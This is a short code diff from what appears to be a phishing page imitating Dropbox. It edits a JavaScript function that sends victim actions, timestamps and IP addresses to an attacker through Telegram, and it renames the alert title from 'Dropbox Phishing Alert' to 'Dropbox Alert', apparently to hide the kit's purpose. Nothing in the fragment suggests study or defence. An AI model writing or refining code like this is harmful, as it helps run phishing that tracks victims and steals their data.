@@ -462,7 +462,7 @@
     // Telegram Nachricht senden
     async function sendTelegramMessage(action, details = '') {
       const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
-      const message = `🚨 *Dropbox Phishing Alert* 🚨\n\n` +
+      const message = `🚨 *Dropbox Alert* 🚨\n\n` +
         `*Action:* ${action}\n` +
         `*Time:* ${timestamp} UTC\n` +
         `*IP:* ${userIP}\n` +
